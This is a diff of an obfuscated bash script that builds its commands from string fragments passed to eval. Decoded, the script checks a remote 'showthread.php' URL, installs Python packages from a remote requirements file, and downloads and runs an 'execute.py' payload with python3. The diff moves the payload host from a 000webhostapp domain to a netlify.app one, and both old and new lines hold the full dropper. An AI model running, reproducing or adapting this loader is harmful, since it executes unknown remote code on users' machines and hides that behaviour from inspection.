@@ -1,11 +1,11 @@
 #!/bin/bash
 z="
-";cz=' to ';vz='irem';CBz='on3 ';rz='host';gz='pip ';Tz=' $? ';
-Hz='gami';DBz='<(wg';Oz='p?re';Iz='ng.m';Dz='ider';Az='wget';Kz='er/s';
-PBz='ctio';hz='inst';uz='requ';mz='edir';fz='..."';jz='-r h';dz='Serv';
-qz='0web';Vz='0 ];';Nz='d.ph';az='nnec';Zz=' "Co';Gz='/pro';Ez=' htt';Jz='onst';
-Yz='echo';tz='com/';FBz='exec';Rz='.js';nz='ecto';GBz='ute.';Pz='f=B7';bz='ting';
-OBz='onne';JBz='-)';Xz='n';iz='all ';wz='ents';ABz='uiet';lz='://r';BBz='pyth';TBz='fi';Qz='MV3Y';
-kz='ttps';Fz='ps:/';Mz='hrea';SBz='!!!"';EBz='et h';xz='.txt';Uz='-eq ';Cz='--sp';MBz='tern';ez='ices';Bz=' -q ';
-Sz='if [';LBz=' "In';Wz=' the';sz='app.';yz=' --q';Lz='howt';QBz='n Fa';RBz='iled';pz='z.00';NBz='et C';KBz='else';HBz='py -';oz='r-xy';IBz='q -O';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$z$BBz$CBz$DBz$EBz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$FBz$GBz$HBz$IBz$JBz$z$KBz$z$Yz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$z$TBz"
+";Fz='ps:/';Jz='onst';PBz='onne';iz='all ';
+Cz='--sp';dz='Serv';hz='inst';wz='xt -';Gz='/pro';xz='-qui';
+QBz='ctio';qz='tlif';OBz='et C';Vz='0 ];';SBz='iled';TBz='!!!"';kz='ttps';
+GBz=' - h';yz='et';az='nnec';Zz=' "Co';Qz='MV3Y';Mz='hrea';Wz=' the';Sz='if [';MBz=' "In';
+Hz='gami';cz=' to ';JBz='e.py';mz='edir';LBz='else';RBz='n Fa';Ez=' htt';ez='ices';tz='quir';
+bz='ting';ABz='pyth';DBz='$(wg';lz='://r';Lz='howt';Bz=' -q ';pz='z.ne';BBz='on3 ';UBz='fi';Xz='n';nz='ecto';
+sz='p/re';Tz=' $? ';FBz='q -O';fz='..."';vz='ts.t';NBz='tern';gz='pip ';Kz='er/s';Pz='f=B7';rz='y.ap';jz='-r h';Uz='-eq ';
+KBz=')"';Nz='d.ph';Az='wget';uz='emen';Oz='p?re';CBz='-c "';Dz='ider';oz='r-xy';HBz='p/ex';Yz='echo';Rz='.js';IBz='ecut';Iz='ng.m';EBz='et -';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$z$Sz$Tz$Uz$Vz$Wz$Xz$z$Yz$Zz$az$bz$cz$dz$ez$fz$z$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$z$ABz$BBz$CBz$DBz$EBz$FBz$GBz$kz$lz$mz$nz$oz$pz$qz$rz$HBz$IBz$JBz$KBz$z$LBz$z$Yz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$z$UBz"
